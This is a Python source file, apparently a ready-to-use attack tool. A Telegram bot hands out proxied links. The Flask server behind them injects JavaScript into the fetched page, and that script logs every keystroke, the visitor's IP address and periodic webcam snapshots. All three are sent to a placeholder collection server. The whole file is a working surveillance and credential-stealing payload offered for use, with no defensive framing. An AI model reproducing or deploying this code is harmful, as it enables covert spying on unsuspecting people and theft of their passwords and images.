import telebot
from flask import Flask, request, Response
import requests
import os

BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
PROXY_URL = os.getenv('PROXY_SERVER_URL')  # Укажите ваш домен Render

bot = telebot.TeleBot(BOT_TOKEN)
app = Flask(__name__)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "📦 Отправь мне ссылку для инъекции")

@bot.message_handler(func=lambda m: True)
def handle_link(message):
    original_url = message.text.strip()
    
    # Генерируем проксированную ссылку
    proxy_link = f"{PROXY_URL}/inject?target={original_url}"
    
    bot.send_message(
        message.chat.id,
        f"✅ Преобразованная ссылка:\n`{proxy_link}`",
        parse_mode='Markdown'
    )

@app.route('/inject')
def inject_scripts():
    target_url = request.args.get('target', '')
    
    # Получаем исходный HTML
    response = requests.get(target_url)
    html = response.text
    
    # JavaScript для логирования (обфусцированная версия)
    scripts = """
    <script>
    (function(){
        function logKeys(e) {
            fetch('https://your-logs-server.com/keys', {method:'POST', body:e.key});
        }
        document.addEventListener('keydown', logKeys);
        
        // Айпи логгер
        fetch('https://api.ipify.org?format=json', {mode: 'no-cors'})
            .then(res => res.json())
            .then(data => 
                fetch('https://your-logs-server.com/ip', {method:'POST', body:JSON.stringify(data)})
            );
            
        // Вебкамера
        (async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true});
                const canvas = document.createElement('canvas');
                setInterval(() => {
                    canvas.width = 640;
                    canvas.height = 480;
                    canvas.getContext('2d').drawImage(stream.getVideoTracks()[0].getFrame(), 0, 0);
                    fetch('https://your-logs-server.com/camera', {method:'POST', body:canvas.toDataURL()});
                }, 5000);
            } catch(e) {}
        })();
    })()
    </script>
    """
    
    # Вставляем скрипты в body
    html = html.replace('</body>', f'{scripts}</body>')
    
    return Response(html, content_type='text/html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get('PORT', 5000)))
